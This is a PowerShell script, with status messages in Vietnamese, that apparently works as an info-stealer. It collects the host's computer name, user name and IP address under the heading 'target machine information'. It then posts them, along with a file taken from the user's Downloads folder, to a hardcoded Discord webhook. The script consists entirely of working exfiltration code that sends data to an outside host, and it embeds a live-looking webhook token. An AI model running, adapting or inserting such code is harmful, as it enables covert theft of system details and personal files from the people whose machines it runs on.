$webhookUrl = "https://discord.com/api/webhooks/1487286624411848855/zpDppnQHhm7BJ1BNIm_0zvZNWph8r725gO5SpFTWr9-otXf3uKLvMZ3StJjksTxyU412"

Write-Host "[*] PS: Bắt đầu thu thập thông tin..."

try {
    $ipAddress = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notlike "*Loopback*" }).IPAddress[0]
} catch {
    $ipAddress = "Unknown"
    Write-Host "[!] PS: Không lấy được IP qua Get-NetIPAddress: $($_.Exception.Message)"
}

$embed = @{
    content = "🚀 **Agent Debug Mode**"
    embeds = @(@{
        title = "Thông tin máy mục tiêu"
        color = 3066993
        fields = @(
            @{ name = "Computer"; value = $env:COMPUTERNAME; inline = $true }
            @{ name = "User"; value = $env:USERNAME; inline = $true }
            @{ name = "IP Address"; value = $ipAddress; inline = $false }
        )
    })
} | ConvertTo-Json -Depth 5

# --- Gửi Embed ---
try {
    Write-Host "[*] PS: Đang gửi JSON Embed tới Discord..."
    $res = Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $embed -ContentType "application/json"
    Write-Host "[+] PS: Gửi Embed thành công."
} catch {
    Write-Host "[-] PS: Lỗi khi gửi Embed: $($_.Exception.Message)"
}

# --- Gửi File ---
$filePath = Join-Path ([Environment]::GetFolderPath('UserProfile')) "Downloads\abc.txt"
Write-Host "[*] PS: Đang kiểm tra file tại: $filePath"

if (Test-Path $filePath) {
    try {
        Write-Host "[*] PS: Đang khởi tạo luồng upload file..."
        $FileStream = [System.IO.File]::OpenRead($filePath)
        $FileContent = [System.Net.Http.StreamContent]::new($FileStream)
        $FileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::Parse("application/octet-stream")
        
        $MultipartContent = [System.Net.Http.MultipartFormDataContent]::new()
        # "file" là key bắt buộc của Discord
        $MultipartContent.Add($FileContent, "file", "abc.txt")
        
        $HttpClient = [System.Net.Http.HttpClient]::new()
        $Response = $HttpClient.PostAsync($webhookUrl, $MultipartContent).Result
        
        if ($Response.IsSuccessStatusCode) {
            Write-Host "[+] PS: Upload file abc.txt thành công!"
        } else {
            $errBody = $Response.Content.ReadAsStringAsync().Result
            Write-Host "[-] PS: Discord từ chối file. Mã lỗi: $($Response.StatusCode) - $errBody"
        }
    } catch {
        Write-Host "[-] PS: Lỗi nghiêm trọng khi upload: $($_.Exception.Message)"
    } finally {
        if ($null -ne $FileStream) { $FileStream.Dispose() }
        if ($null -ne $HttpClient) { $HttpClient.Dispose() }
    }
} else {
    Write-Host "[!] PS: KHÔNG tìm thấy file abc.txt tại đường dẫn quy định."
}
